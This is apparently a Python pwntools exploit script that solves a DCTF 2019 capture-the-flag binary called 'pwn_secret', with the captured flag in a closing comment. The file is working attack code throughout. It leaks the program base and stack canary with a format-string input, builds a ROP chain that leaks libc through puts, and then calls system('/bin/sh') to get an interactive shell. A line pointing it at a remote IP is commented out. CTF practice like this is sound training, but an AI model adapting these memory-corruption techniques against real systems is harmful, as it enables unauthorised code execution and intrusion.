from pwn import *
import os

gets_plt_off = 0x930
mid_bss_off  = 0x2020b0
main_off = 0xb6d

libc_name = "./libc.so.6"

def exploit():
    LIBC = ELF(libc_name)
    io = process("./pwn_secret")
    #io = remote("206.81.24.129",1339)
    io.recvuntil("Name: ")


    name ="|%16$p|%15$p|"
    io.send(name)
    io.recvuntil("Hillo ")


    io.recv(1)

    elf = int(io.recvuntil("|").split("|")[0][2:], 16) - 0xc40
    cookie = int(io.recvuntil("|").split("|")[0][2:], 16)

    log.info("ELF {}".format(hex(elf)))
    log.info("COOKIE {}".format(hex(cookie)))

    io.recvuntil("Phrase: ")


    gets_plt = elf + gets_plt_off
    mid_bss = elf + mid_bss_off
    main = elf + main_off
    pop_rdi = elf + 0x0000000000000ca3
    puts_plt = elf + 0x8a0
    puts_got = elf + 0x202018
    ret = elf + 0x0000000000000889


    ov  = "supersecretdctf2019\x00"
    ov += 'A'*116
    ov += p64(cookie)
    ov += 'B'*8
    ov += p64(pop_rdi)
    ov += p64(mid_bss)
    ov += p64(gets_plt)
    ov += p64(pop_rdi)
    ov += p64(puts_got)
    ov += p64(puts_plt)
    ov += p64(main)


    io.sendline(ov)

    payload = "/bin/sh\x00"

    io.sendline(payload)
    io.recvline()
    io.recvline()
    io.recvline()
    puts = u64(io.recvline()[:-1].ljust(8, p8(0)))

    libc = puts - LIBC.symbols["puts"]
    system = libc + LIBC.symbols["system"]
    binsh = libc + next(LIBC.search("/bin/sh"))


    log.info("puts {}".format(hex(puts)))
    log.info("libc {}".format(hex(libc)))
    log.info("system {}".format(hex(system)))
    log.info("binsh {}".format(hex(binsh)))


    assert libc & 0xfff == 0

    io.sendline("oi")

    ov  = "supersecretdctf2019\x00"
    ov += 'A'*116
    ov += p64(cookie)
    ov += 'B'*8
    ov += p64(pop_rdi)
    ov += p64(binsh)
    ov += p64(system)

    io.sendline(ov)


    io.interactive()
    io.close()

exploit()
#DCTF{17AF6D77BFDAC4CAF6CD2FD2F3EB85FB654D2E36745F926169C0958333496979}
